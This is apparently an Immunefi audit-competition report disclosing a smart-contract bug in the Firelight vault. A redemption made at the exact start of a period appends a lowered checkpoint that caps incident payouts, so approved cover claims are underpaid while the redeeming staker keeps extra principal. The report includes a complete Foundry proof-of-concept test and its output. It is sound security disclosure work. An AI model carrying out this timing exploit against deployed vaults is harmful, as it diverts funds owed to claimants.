# 90080 sc high period start redemption appends a deflated exposure checkpoint and underpays valid cover claims

## #90080 \[SC-High] Period-start redemption appends a deflated exposure checkpoint and underpays valid cover claims

**Submitted on Aug 22nd 2026 at 21:39:52 UTC by @v\_c0d35 for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #90080
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency

### Description

## A period-start redemption lowers the incident payout cap while the redeemed principal remains exposed

### Brief/Intro

At the exact start of a vault period, an unprivileged staker can redeem shares and make `FirelightVault` record the post-redemption active balance as that period's historical payout cap, even though the redeemed principal remains in the withdrawal bucket that is exposed to incidents from the same period. Cover can then be committed and settled honestly within capacity recomputed from the reduced balance, but a later valid incident is paid only up to the reduced, unleveraged checkpoint. The incident closes after the truncated payment, leaving the payout receiver short and allowing the redeeming staker to retain more principal than the same redemption performed one second later.

### Vulnerability Details

This report assesses the public `v1_audit_ready` source at commit `42f9ea5e43d88b35197b901acc2a8c24b314fa62`.

The vulnerability comes from two incompatible classifications of a redemption executed at `capturePeriodStart`:

1. `currentPeriod()` already returns the new capture period at that timestamp. `_requestWithdraw` consequently assigns the redeemed assets to `currentPeriod() + 1`, and `payout` expressly counts that bucket as exposed to incidents captured in the current period.
2. The same redemption records the post-redemption active balance in `_traceTotalAssets` at the exact capture-period-start key. `totalAssetsAt(capturePeriodStart)` performs an inclusive lookup, so this lower balance becomes the payout cap for the whole period.

The public `redeem` path first creates the withdrawal request and then records the reduced active-asset total ([`FirelightVault.sol`, lines 717–743](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L717-L743)):

```solidity
uint256 ownerBalance = _requestWithdraw(assets, shares, receiver, owner);

_logTrace(owner, ownerBalance, _totalSupply - shares, _totalAssets - assets, true);
```

At the boundary, `_requestWithdraw` uses the already-incremented `currentPeriod()` and places those assets in the next withdrawal bucket ([`FirelightVault.sol`, lines 994–1027](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L994-L1027)):

```solidity
uint256 period = currentPeriod() + 1;
withdrawAssets[period] += assets;
pendingWithdrawAssets += assets;
```

`_logTrace` stores the post-redemption active balance under `block.timestamp` ([`FirelightVault.sol`, lines 1044–1055](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L1044-L1055)). When the timestamp equals the new period's start and no checkpoint already exists at that key, `Checkpoints.push` appends a new checkpoint. The later lookup returns the most recent key lower than or equal to the requested key ([`Checkpoints.sol`, lines 193–223](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/lib/Checkpoints.sol#L193-L223)). The boundary checkpoint is therefore included in `totalAssetsAt(capturePeriodStart)`.

The payout function uses this reduced snapshot as an absolute cap, while separately adding the redemption bucket back into the amount that remains payable ([`FirelightVault.sol`, lines 900–927](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L900-L927)):

```solidity
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
uint256 currentActiveAssets = totalAssets();
uint256 capturePeriodWithdrawals = withdrawAssets[capturePeriod + 1];

uint256 activePayableAmount = currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

This creates the contradiction: the redeemed assets are present in `activePayableAmount`, but the cap against that amount was recorded after excluding them.

The allocator does not prevent the resulting shortfall. It calculates cover capacity by multiplying the period-start collateral value by `effectiveLeverage / minCAR` ([`CoverOrderAllocator.sol`, lines 689–724](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L689-L724)). The repository's standard fixture sets `minCAR = 12,000` and `effectiveLeverage = 24,000`, producing 2x capacity ([`test/setup/fixtures.js`, lines 164–170](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/test/setup/fixtures.js#L164-L170)). Capacity therefore remains sufficient to sell cover whose legitimate vault payout exceeds the unleveraged, deflated snapshot.

The end-to-end reproduction uses the following sequence:

1. An honest staker deposits 60,000 six-decimal FXRP and the attacker deposits 40,000 FXRP.
2. A curator creates a 200,000-USD cover order through the normal lifecycle.
3. At the exact start of the target period, the attacker redeems all shares. This appends a 60,000-FXRP checkpoint and assigns the attacker's 40,000 FXRP to `withdrawAssets[capturePeriod + 1]`.
4. One hour later, the allocator honestly recomputes capacity. At the test price of 2 USD per FXRP, the remaining stake alone provides 120,000 USD of collateral and a conservative 240,000-USD capacity lower bound at the repository's 2x ratio. Including the funded 20,000-USDC buffer, the allocator's formula produces 280,000 USD of capacity, so the 200,000-USD order is valid.
5. The allocator commits and settles the order after the redemption.
6. Honest incident roles create, assess, and approve a covered 200,000-USD loss. The funded first-loss buffer pays 20,000 USDC, leaving a valid 90,000-FXRP vault leg.
7. `FirelightVault.payout` has 100,000 FXRP available across active assets and the exposed withdrawal bucket, but caps payment at the attacker's 60,000-FXRP boundary checkpoint.
8. `IncidentManager.approveCurrentAssessment` records the amount returned by the vault and then sets the incident to `CLOSED` ([`IncidentManager.sol`, lines 403–438](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/IncidentManager.sol#L403-L438)). The unpaid 30,000 FXRP is not recorded as a remaining balance on that incident.

The reproduction compares this execution with an otherwise identical control in which the attacker redeems one second after the boundary. It also asserts that the latest checkpoint key is earlier than `capturePeriodStart` before the redemption, that the redemption increases the checkpoint-array length, and that the newly appended key equals `capturePeriodStart`. The vulnerable execution therefore follows the append branch in `Checkpoints.push`.

The boundary is published in advance by `currentPeriodEnd()`. Exact equality also occurs naturally on Flare: for example, blocks [`67921346`](https://flare-explorer.flare.network/block/67921346), [`67843343`](https://flare-explorer.flare.network/block/67843343), and [`67764965`](https://flare-explorer.flare.network/block/67764965) have timestamps `1787319769`, `1787233369`, and `1787146969`, respectively, matching consecutive calculated boundaries of the deployed vault's daily Phase-1 period configuration. The same timestamp comparison governs a longer configured period.

### Impact Details

The passing end-to-end test demonstrates the following amounts:

| Measurement                                    | One-second-later control | Exact-boundary redemption |
| ---------------------------------------------- | -----------------------: | ------------------------: |
| Period-start payout cap                        |             100,000 FXRP |               60,000 FXRP |
| Vault-stake-only capacity lower bound          |              400,000 USD |               240,000 USD |
| Allocator capacity including the funded buffer |              440,000 USD |               280,000 USD |
| Settled cover                                  |              200,000 USD |               200,000 USD |
| First-loss-buffer payment                      |              20,000 USDC |               20,000 USDC |
| Valid vault leg                                |              90,000 FXRP |               90,000 FXRP |
| Vault payment                                  |              90,000 FXRP |               60,000 FXRP |
| Redeeming staker's eventual withdrawal         |               4,000 FXRP |               16,000 FXRP |

At the test's 2-USD FXRP price, the payout receiver receives 60,000 USD less than the approved loss requires. The attacker retains an additional 12,000 FXRP, worth 24,000 USD at that price, compared with the one-second-later control. The remaining 18,000 FXRP of the shortfall stays with the active stake. Together, the value retained by the stakers exactly equals the 30,000-FXRP amount omitted from the vault payment.

The loss is created after the order has been committed and settled inside capacity recomputed from the already-reduced period-start checkpoint. The only attacker-controlled action is the timing of the public redemption; order creation, matching, settlement, incident creation, assessment, and approval all follow their normal authorized paths. Because the incident is marked closed immediately after the capped transfer, its recorded lifecycle completes while the payout receiver has received less than the approved and covered amount.

The affected amount scales with the difference between the valid vault leg and the attacker-deflated period-start cap. A larger pre-boundary redemption can lower that cap further while the same redeemed principal remains exposed in the payable withdrawal bucket, limited by the cover that still fits within the protocol's leveraged capacity.

### References

* [`FirelightVault.periodAtTimestamp`, `currentPeriod`, and `currentPeriodEnd`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L315-L354)
* [`FirelightVault.redeem` and its checkpoint write](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L709-L743)
* [`FirelightVault.payout`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L878-L966)
* [`Checkpoints.Trace256` insertion and inclusive lookup](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/lib/Checkpoints.sol#L193-L223)
* [`CoverOrderAllocator._computeAvailableCapacity`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L689-L724)
* [`IncidentManager._executePayout`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/IncidentManager.sol#L618-L705)
* [`IncidentManager.approveCurrentAssessment`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/IncidentManager.sol#L403-L438)

### Proof of Concept

## End-to-end reproduction: period-start redemption deflates the payout cap

This guide reproduces the issue against the public `v1_audit_ready` repository at commit `42f9ea5e43d88b35197b901acc2a8c24b314fa62`. It deploys the actual `FirelightVault`, `CoverOrderAllocator`, `CoverNFT`, and `IncidentManager` implementations locally and drives their complete order, settlement, incident, assessment, payout, and withdrawal lifecycle.

### What the test proves

The test executes two otherwise identical timelines:

1. Control: the staker redeems one second after the capture period begins.
2. Boundary case: the staker redeems at exactly `capturePeriodStart`.

The boundary case proves all of the following:

* there is no checkpoint at `capturePeriodStart` before the redemption;
* the redemption appends a new checkpoint instead of replacing an existing same-key checkpoint;
* the redeemed principal remains in `withdrawAssets[capturePeriod + 1]` and is therefore still payable for the capture period;
* the honest allocator commits and settles only after the redemption and recomputes capacity from the reduced snapshot;
* the same cover remains within that reduced capacity using the repository's standard 2x leverage configuration;
* a funded and approved first-loss buffer pays the same amount in both timelines;
* the approved vault leg is 90,000 FXRP in both timelines;
* the control pays the complete 90,000-FXRP vault leg;
* the boundary case pays only 60,000 FXRP and then closes the incident; and
* the boundary redemption lets the staker retain 12,000 FXRP more than the control.

### Prerequisites

Install the following tools:

* Git
* Node.js and npm
* Foundry (`forge`)

The commands below assume a Unix-like shell.

### 1. Clone the public repository at the assessed commit

```bash
git clone --branch v1_audit_ready https://github.com/immunefi-team/audit-comp-firelight.git
cd audit-comp-firelight
git checkout 42f9ea5e43d88b35197b901acc2a8c24b314fa62
```

Confirm the revision:

```bash
git rev-parse HEAD
```

Expected result:

```
42f9ea5e43d88b35197b901acc2a8c24b314fa62
```

### 2. Install the repository and Foundry dependencies

From the repository root, run:

```bash
npm install
git clone --depth 1 https://github.com/foundry-rs/forge-std lib/forge-std
```

### 3. Add the Foundry configuration

Save the following complete file as `foundry.toml` in the repository root:

```toml
[profile.default]
src = "contracts"
test = "test"
out = "out"
libs = ["node_modules", "lib"]
skip = ["contracts/fasset/**"]
evm_version = "london"
optimizer = true
optimizer_runs = 10000
via_ir = true
auto_detect_remappings = true
remappings = [
  "forge-std/=lib/forge-std/src/",
  "@openzeppelin/contracts-upgradeable/=node_modules/@openzeppelin/contracts-upgradeable/",
  "@openzeppelin/contracts/=node_modules/@openzeppelin/contracts/",
]
```

### 4. Add the end-to-end test

Save the following complete file as `test/PeriodStartPayoutCap.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {FirelightVault} from "contracts/core/FirelightVault.sol";
import {CoverNFT} from "contracts/core/CoverNFT.sol";
import {CoverOrderAllocator} from "contracts/core/CoverOrderAllocator.sol";
import {ICoverOrderAllocator} from "contracts/core/interfaces/ICoverOrderAllocator.sol";
import {IncidentManager} from "contracts/core/IncidentManager.sol";
import {IIncidentManager} from "contracts/core/interfaces/IIncidentManager.sol";
import {IFirelightVault} from "contracts/core/interfaces/IFirelightVault.sol";
import {IAggregatorV3} from "contracts/core/interfaces/IAggregatorV3.sol";
import {MockERC20} from "contracts/test/MockERC20.sol";
import {MockAggregatorV3} from "contracts/test/MockAggregatorV3.sol";

/// @notice Demonstrates that a redemption at exactly capturePeriodStart appends a
/// reduced total-assets checkpoint at the key later used as the payout cap.
/// The same assets remain in the capture period's payable withdrawal bucket.
///
/// This test deliberately commits and settles cover after the redemption. The
/// allocator therefore recomputes capacity from the reduced snapshot. At the
/// repository's standard 2x leverage ratio, the cover remains inside that
/// reduced capacity while the unleveraged payout cap truncates the vault leg.
///
/// The first-loss buffer is funded and has approved IncidentManager. The same
/// buffer payment succeeds in both arms, isolating the vault-side discrepancy.
contract PeriodStartPayoutCapTest is Test {
    address admin = address(0xA11CE);
    address curator = address(0xC0FFEE);
    address allocatorRole = address(0xA110);
    address approver = address(0xAAA1);
    address premiumCollector = address(0xDEAD01);
    address payoutReceiver = address(0xFEED01);
    address flbWallet = address(0xF1B0);
    address buyer = address(0xB111);
    address payoutRecipient = address(0xB222);
    address honestStaker = address(0x5001);
    address attacker = address(0x5002);

    MockERC20 fxrp;
    MockERC20 usdc;
    MockAggregatorV3 feed;

    FirelightVault vault;
    CoverNFT nft;
    CoverOrderAllocator allocator;
    IncidentManager incidentManager;

    uint48 constant PERIOD_DURATION = 30 days;
    int256 constant FXRP_PRICE_USD = 2e18;
    uint256 constant HONEST_STAKE = 60_000e6;
    uint256 constant ATTACKER_STAKE = 40_000e6;
    uint256 constant COVER_SOLD = 200_000e18;
    uint256 constant FLB_FUNDS = 20_000e6;

    bytes32 marketId;
    uint256 referenceNonce;

    function _deploy() internal {
        fxrp = new MockERC20("FXRP", "FXRP", 6);
        usdc = new MockERC20("USDC", "USDC", 6);
        feed = new MockAggregatorV3(18, FXRP_PRICE_USD);

        FirelightVault.InitParams memory vaultParams = FirelightVault.InitParams({
            defaultAdmin: admin,
            limitUpdater: admin,
            blocklister: admin,
            pauser: admin,
            periodConfigurationUpdater: admin,
            rescuer: admin,
            depositLimit: 1e30,
            periodConfigurationDuration: PERIOD_DURATION
        });
        vault = FirelightVault(
            address(
                new ERC1967Proxy(
                    address(new FirelightVault()),
                    abi.encodeCall(
                        FirelightVault.initialize,
                        (IERC20(address(fxrp)), "Firelight FXRP", "flFXRP", abi.encode(vaultParams))
                    )
                )
            )
        );

        nft = CoverNFT(
            address(
                new ERC1967Proxy(
                    address(new CoverNFT()),
                    abi.encodeCall(CoverNFT.initialize, ("Cover", "CVR", "", admin, admin, admin, admin))
                )
            )
        );

        ICoverOrderAllocator.Market[] memory markets = new ICoverOrderAllocator.Market[](1);
        markets[0] = ICoverOrderAllocator.Market({chainId: 1, protocol: "aave", market: bytes32("pool")});

        ICoverOrderAllocator.ProtocolConcentrationInput[] memory concentrations =
            new ICoverOrderAllocator.ProtocolConcentrationInput[](1);
        concentrations[0] = ICoverOrderAllocator.ProtocolConcentrationInput({
            chainId: 1,
            protocol: "aave",
            maxProtocolConcentrationBps: 10_000
        });

        address[] memory premiumTokens = new address[](1);
        premiumTokens[0] = address(usdc);

        // This matches the repository's standard allocator fixture: 1.2 minCAR
        // and a 2x capacity multiplier (24,000 / 12,000).
        ICoverOrderAllocator.CapacityConfig memory capacityConfig = ICoverOrderAllocator.CapacityConfig({
            minCAR: 12_000,
            firstLossBufferToken: IERC20(address(usdc)),
            firstLossBuffer: flbWallet,
            effectiveLeverage: 24_000,
            minOrderMarketCoverAmount: 1e18,
            divergenceToleranceBps: 0
        });

        ICoverOrderAllocator.InitParams memory allocatorParams = ICoverOrderAllocator.InitParams({
            vault: IFirelightVault(address(vault)),
            premiumCollector: premiumCollector,
            coverNFT: nft,
            priceFeedAdapter: IAggregatorV3(address(feed)),
            maxPriceAge: 3600,
            premiumTokens: premiumTokens,
            admin: admin,
            adminRole: admin,
            curatorRole: curator,
            allocatorRole: allocatorRole,
            configAdminRole: admin,
            initialProtocolConcentrations: concentrations,
            newMarkets: markets,
            capacityConfig: capacityConfig
        });
        allocator = CoverOrderAllocator(
            address(
                new ERC1967Proxy(
                    address(new CoverOrderAllocator()),
                    abi.encodeCall(CoverOrderAllocator.initialize, (allocatorParams))
                )
            )
        );
        marketId = keccak256(abi.encode(uint64(1), "aave", bytes32("pool")));

        incidentManager = IncidentManager(
            address(
                new ERC1967Proxy(
                    address(new IncidentManager()),
                    abi.encodeCall(
                        IncidentManager.initialize,
                        (
                            admin,
                            curator,
                            approver,
                            admin,
                            admin,
                            admin,
                            admin,
                            admin,
                            payoutReceiver,
                            ICoverOrderAllocator(address(allocator)),
                            IAggregatorV3(address(feed)),
                            3600
                        )
                    )
                )
            )
        );

        vm.startPrank(admin);
        nft.grantRole(nft.MINTER_ROLE(), address(allocator));
        vault.grantRole(vault.PAYOUT_ROLE(), address(incidentManager));
        vault.grantRole(vault.INCIDENT_ROLE(), address(incidentManager));
        vault.grantRole(vault.PAYOUT_ALLOWLIST_ROLE(), admin);
        vault.addToPayoutAllowlist(payoutReceiver);
        vm.stopPrank();

        // Use a funded, approved buffer so both payout sources follow their
        // documented successful path.
        usdc.mint(flbWallet, FLB_FUNDS);
        vm.prank(flbWallet);
        usdc.approve(address(incidentManager), type(uint256).max);

        fxrp.mint(honestStaker, HONEST_STAKE);
        fxrp.mint(attacker, ATTACKER_STAKE);
        vm.prank(honestStaker);
        fxrp.approve(address(vault), type(uint256).max);
        vm.prank(attacker);
        fxrp.approve(address(vault), type(uint256).max);

        usdc.mint(buyer, 10_000_000e6);
        vm.prank(buyer);
        usdc.approve(address(allocator), type(uint256).max);
    }

    function _capacity(uint256 assetsAtStart) internal pure returns (uint256) {
        uint256 stakedUsd = (assetsAtStart * 1e12) * uint256(FXRP_PRICE_USD) / 1e18;
        return stakedUsd * 24_000 / 12_000;
    }

    /// @dev At the assessed commit, `_traceTotalAssets._trace._checkpoints`
    /// occupies slot 12 of FirelightVaultStorage. An OZ Checkpoint208 packs its
    /// uint48 key and uint208 value into one word.
    function _traceLength() internal view returns (uint256) {
        return uint256(vm.load(address(vault), bytes32(uint256(12))));
    }

    function _traceKeyAt(uint256 index) internal view returns (uint48) {
        bytes32 firstElement = keccak256(abi.encode(uint256(12)));
        return uint48(uint256(vm.load(address(vault), bytes32(uint256(firstElement) + index))));
    }

    function _leaf(uint256 orderId, ICoverOrderAllocator.MarketCoverAllocation[] memory allocations)
        internal
        pure
        returns (bytes32)
    {
        return keccak256(bytes.concat(keccak256(abi.encode(orderId, allocations))));
    }

    struct Result {
        uint256 capSeenByPayout;
        uint256 liveCapacityAtCommit;
        uint256 vaultRequested;
        uint256 vaultPaid;
        uint256 firstLossBufferPaid;
        uint256 attackerResidue;
        uint256 activeAssetsRemaining;
        bool incidentClosed;
    }

    /// @dev `exitDelay` is the only difference between the two executions:
    /// zero means exact boundary; one means one second after the boundary.
    function _run(uint48 exitDelay) internal returns (Result memory result) {
        _deploy();
        referenceNonce++;

        vm.prank(honestStaker);
        vault.deposit(HONEST_STAKE, honestStaker);
        vm.warp(vm.getBlockTimestamp() + 60);
        vm.prank(attacker);
        vault.deposit(ATTACKER_STAKE, attacker);
        assertEq(vault.totalAssets(), HONEST_STAKE + ATTACKER_STAKE, "precondition: total stake");

        // Create an order one period before its target period, as required by
        // the normal allocator lifecycle.
        vm.warp(vault.currentPeriodEnd());
        ICoverOrderAllocator.MarketAllocationInput[] memory requestedMarkets =
            new ICoverOrderAllocator.MarketAllocationInput[](1);
        requestedMarkets[0] = ICoverOrderAllocator.MarketAllocationInput({
            marketId: marketId,
            coverRateAnnual: 500,
            coverAmount: COVER_SOLD
        });
        vm.prank(curator);
        uint256 orderId = allocator.createCoverOrder(
            buyer,
            payoutRecipient,
            "boundary-check",
            address(usdc),
            requestedMarkets,
            ICoverOrderAllocator.CoverOrderType.NEW
        );

        // Enter the target/capture period.
        vm.warp(vault.currentPeriodEnd());
        uint256 capturePeriod = vault.currentPeriod();
        uint48 capturePeriodStart = uint48(vm.getBlockTimestamp());
        assertEq(capturePeriodStart, vault.currentPeriodStart(), "precondition: exact period start");
        assertEq(
            vault.totalAssetsAt(capturePeriodStart),
            HONEST_STAKE + ATTACKER_STAKE,
            "precondition: untouched inherited snapshot"
        );

        // The sole unprivileged action.
        vm.warp(capturePeriodStart + exitDelay);
        assertEq(vault.currentPeriod(), capturePeriod, "redemption belongs to capture period");

        uint256 traceLengthBefore = _traceLength();
        assertLt(
            _traceKeyAt(traceLengthBefore - 1),
            capturePeriodStart,
            "no checkpoint exists at the boundary; this cannot be a replacement"
        );

        uint256 attackerShares = vault.balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(attackerShares, attacker, attacker);

        assertEq(_traceLength(), traceLengthBefore + 1, "redemption appends a new checkpoint");
        assertEq(
            _traceKeyAt(_traceLength() - 1),
            capturePeriodStart + exitDelay,
            "new checkpoint has the redemption timestamp"
        );
        assertEq(
            vault.withdrawAssets(capturePeriod + 1),
            ATTACKER_STAKE,
            "the same principal remains in the capture-period payable bucket"
        );
        assertEq(vault.totalAssets(), HONEST_STAKE, "active assets are reduced after redemption");

        result.capSeenByPayout = vault.totalAssetsAt(capturePeriodStart);

        // Honest matching and settlement occur only after the redemption. The
        // allocator reads the reduced snapshot when recomputing capacity.
        vm.warp(capturePeriodStart + 1 hours);
        feed.setAnswer(FXRP_PRICE_USD);
        result.liveCapacityAtCommit = _capacity(vault.totalAssetsAt(vault.currentPeriodStart()));
        assertGe(result.liveCapacityAtCommit, COVER_SOLD, "cover is inside reduced live capacity");

        ICoverOrderAllocator.MarketCoverAllocation[] memory allocations =
            new ICoverOrderAllocator.MarketCoverAllocation[](1);
        allocations[0] = ICoverOrderAllocator.MarketCoverAllocation({
            marketId: marketId,
            allocatedCover: COVER_SOLD
        });

        vm.prank(allocatorRole);
        allocator.commitAllocation(capturePeriod, _leaf(orderId, allocations), COVER_SOLD, COVER_SOLD);
        bytes32[] memory proof = new bytes32[](0);
        vm.prank(allocatorRole);
        allocator.settleCoverOrder(orderId, allocations, proof);

        // Create, assess, and approve one valid incident against the settled
        // cover, using only the normal privileged workflow.
        vm.warp(capturePeriodStart + 2 hours);
        feed.setAnswer(FXRP_PRICE_USD);
        vm.prank(curator);
        uint256 incidentId = incidentManager.createIncident(
            uint48(vm.getBlockTimestamp()),
            "covered loss",
            bytes32(referenceNonce * 7919 + 3)
        );
        vm.prank(curator);
        incidentManager.confirmIncident(incidentId, "ipfs://assessment");

        IIncidentManager.AssessmentLoss[] memory losses = new IIncidentManager.AssessmentLoss[](1);
        losses[0] = IIncidentManager.AssessmentLoss({
            coverTokenId: orderId,
            marketId: marketId,
            amount: COVER_SOLD
        });
        vm.prank(curator);
        incidentManager.addAssessmentLosses(incidentId, losses);
        vm.prank(curator);
        incidentManager.submitCurrentAssessment(incidentId);

        vm.warp(capturePeriodStart + 3 hours);
        feed.setAnswer(FXRP_PRICE_USD);

        uint256 expectedRemainderUsd = COVER_SOLD - FLB_FUNDS * 1e12;
        result.vaultRequested = expectedRemainderUsd * 1e18 / uint256(FXRP_PRICE_USD) * 1e6 / 1e18;

        uint256 fxrpBefore = fxrp.balanceOf(payoutReceiver);
        uint256 usdcBefore = usdc.balanceOf(payoutReceiver);
        vm.prank(approver);
        incidentManager.approveCurrentAssessment(incidentId);
        result.vaultPaid = fxrp.balanceOf(payoutReceiver) - fxrpBefore;
        result.firstLossBufferPaid = usdc.balanceOf(payoutReceiver) - usdcBefore;

        (IIncidentManager.Incident memory incident,) = incidentManager.getIncident(incidentId);
        result.incidentClosed = incident.status == IIncidentManager.IncidentStatus.CLOSED;

        // The approved incident is closed and cannot accept another assessment.
        vm.prank(curator);
        vm.expectRevert();
        incidentManager.addAssessmentLosses(incidentId, losses);

        // Once the delay elapses, measure what the attacker retains from the
        // withdrawal bucket after the vault payout.
        vm.warp(vault.currentPeriodEnd() + PERIOD_DURATION + 1);
        uint256 attackerBalanceBefore = fxrp.balanceOf(attacker);
        if (vault.withdrawAssets(capturePeriod + 1) > 0) {
            vm.prank(attacker);
            vault.claimWithdraw(capturePeriod + 1);
        }
        result.attackerResidue = fxrp.balanceOf(attacker) - attackerBalanceBefore;
        result.activeAssetsRemaining = vault.totalAssets();
    }

    function testPeriodStartRedemptionCutsPayoutCap() public {
        vm.warp(1_700_000_000);

        Result memory control = _run(1);
        Result memory boundary = _run(0);

        emit log_named_uint("control period-start cap", control.capSeenByPayout);
        emit log_named_uint("boundary period-start cap", boundary.capSeenByPayout);
        emit log_named_uint("control recomputed capacity", control.liveCapacityAtCommit);
        emit log_named_uint("boundary recomputed capacity", boundary.liveCapacityAtCommit);
        emit log_named_uint("vault leg requested in both arms", control.vaultRequested);
        emit log_named_uint("control vault payment", control.vaultPaid);
        emit log_named_uint("boundary vault payment", boundary.vaultPaid);
        emit log_named_uint("control attacker residue", control.attackerResidue);
        emit log_named_uint("boundary attacker residue", boundary.attackerResidue);

        // Both arms use a fully funded and approved first-loss buffer.
        assertEq(control.firstLossBufferPaid, FLB_FUNDS, "control buffer payment");
        assertEq(boundary.firstLossBufferPaid, FLB_FUNDS, "boundary buffer payment");

        // Both arms sell the same cover inside honestly recomputed capacity.
        assertGe(control.liveCapacityAtCommit, COVER_SOLD, "control: no oversale");
        assertGe(boundary.liveCapacityAtCommit, COVER_SOLD, "boundary: no oversale");
        assertEq(control.vaultRequested, boundary.vaultRequested, "same valid assessed vault leg");
        assertTrue(control.incidentClosed && boundary.incidentClosed, "both incidents close");

        // One second after the boundary, the inherited snapshot remains intact
        // and the 90,000-FXRP vault leg is paid in full.
        assertEq(control.capSeenByPayout, 100_000e6, "control snapshot");
        assertEq(control.vaultRequested, 90_000e6, "vault leg after funded buffer");
        assertEq(control.vaultPaid, control.vaultRequested, "control pays full vault leg");
        assertEq(control.attackerResidue, 4_000e6, "control residue after proportional slash");

        // At the exact boundary, the appended checkpoint cuts the cap to the
        // post-redemption active amount even though the redeemed 40,000 FXRP is
        // still included in the payout's payable withdrawal bucket.
        assertEq(boundary.capSeenByPayout, 60_000e6, "boundary snapshot is deflated");
        assertEq(boundary.vaultPaid, 60_000e6, "boundary payout is capped");

        uint256 claimantShortfall = control.vaultPaid - boundary.vaultPaid;
        uint256 attackerGain = boundary.attackerResidue - control.attackerResidue;
        assertEq(claimantShortfall, 30_000e6, "approved vault-leg shortfall");
        assertEq(attackerGain, 12_000e6, "attacker retains additional principal");

        emit log_named_uint("claimant shortfall", claimantShortfall);
        emit log_named_uint("attacker gain", attackerGain);

        // The unpaid amount remains with the attacker and active staker.
        assertEq(
            boundary.activeAssetsRemaining - control.activeAssetsRemaining + attackerGain,
            claimantShortfall,
            "the shortfall equals value retained by stakers"
        );
    }
}
```

### 5. Build the public repository

Run:

```bash
forge build
```

The build must finish with:

```
Compiler run successful!
```

Foundry may also print lint notes from the repository. They do not affect compilation or the test.

### 6. Run the end-to-end reproduction

Run:

```bash
forge test --match-path test/PeriodStartPayoutCap.t.sol -vv
```

The relevant output is:

```
[PASS] testPeriodStartRedemptionCutsPayoutCap()
Logs:
  control period-start cap: 100000000000
  boundary period-start cap: 60000000000
  control recomputed capacity: 400000000000000000000000
  boundary recomputed capacity: 240000000000000000000000
  vault leg requested in both arms: 90000000000
  control vault payment: 90000000000
  boundary vault payment: 60000000000
  control attacker residue: 4000000000
  boundary attacker residue: 16000000000
  claimant shortfall: 30000000000
  attacker gain: 12000000000
```

FXRP has six decimals in this reproduction. The output therefore shows:

* 100,000 FXRP control snapshot versus a 60,000 FXRP boundary snapshot;
* 400,000 USD control capacity versus 240,000 USD capacity after the boundary redemption;
* the same 200,000 USD cover fits within both capacities;
* the funded buffer pays 20,000 USDC in both executions;
* the resulting vault leg is 90,000 FXRP in both executions;
* the control pays all 90,000 FXRP;
* the exact-boundary execution pays only 60,000 FXRP;
* the approved incident closes with a 30,000-FXRP shortfall; and
* the redeeming staker receives 16,000 FXRP instead of 4,000 FXRP, an additional 12,000 FXRP.

The checkpoint assertions are part of the passing test. If the boundary write were a same-key replacement, the assertions requiring no existing boundary checkpoint and a one-element increase in checkpoint length would fail.
